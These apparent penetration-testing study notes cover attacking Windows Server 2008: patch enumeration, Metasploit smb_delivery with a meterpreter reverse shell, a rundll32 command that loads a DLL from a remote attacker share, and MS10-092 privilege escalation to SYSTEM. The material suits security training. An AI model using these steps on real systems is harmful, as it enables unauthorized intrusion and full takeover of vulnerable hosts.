🧠 Mindset First: Why This Matters
Server 2008 is End of Life (EOL) → No security updates, tons of known vulnerabilities.

Found mostly on internal assessments (hospitals, universities, gov).

Approach with care — legacy doesn’t always mean low importance.

🧩 Got This, Do That – Enumeration Phase
✅ Got a suspected 2008 R2 host?
Run systeminfo or check the banner.

Confirm it's Windows Server 2008 or R2 (Build 7600 / 7601).

✅ Want to check installed patches?
wmic qfe — Quick view of hotfixes.

Google the last installed KB to get a rough patch cutoff.

✅ Need more detail?
Use Windows Exploit Suggester (give it systeminfo output).

Use Sherlock.ps1 on the target for known local privilege escalation CVEs.

🛠️ Got Missing Patches? Do This – Exploitation Phase
🧪 Identified MS10-092 or others from Sherlock/WE-S?
Check if it's exploitable on 64-bit.

Not all exploits work on x64 (Sherlock shows that clearly).

💉 Using Metasploit (smb_delivery + rundll32)?
Use exploit/windows/smb/smb_delivery

Set payload = windows/meterpreter/reverse_tcp

Set target = 0 (DLL)

Exploit → You’ll get a command like:

bash
Copy
Edit
rundll32.exe \\10.10.14.3\SHARE\test.dll,0
Run this on the target.

🪜 Privilege Escalation: Local Exploit Time
✅ Got a shell?
Check current getuid in Meterpreter

Use ps to find a 64-bit process and migrate into it (if needed)

🎯 Exploit MS10-092
Use exploit/windows/local/ms10_092_schelevator

Set:

SESSION = your current Meterpreter session

LHOST, LPORT

Run exploit

💥 You should pop SYSTEM and be good to go.

🧠 Key Reminders:
Concept	Why It's Important
Server 2008	Loaded with LPE vulns. Sherlock + Exploit Suggester = best tools
Migration	Many LPE exploits require 64-bit process context
Metasploit Delivery	Quick way to get a shell with minimal user interaction
Reporting	Understand why a legacy system exists before recommending nuking it
⚔️ Pro Tip:
Don’t stop at 1 path. Re-run Sherlock, WES, manual checks — many Server 2008s are swiss cheese. It’s a good place to practice multiple privilege escalation paths on one target.
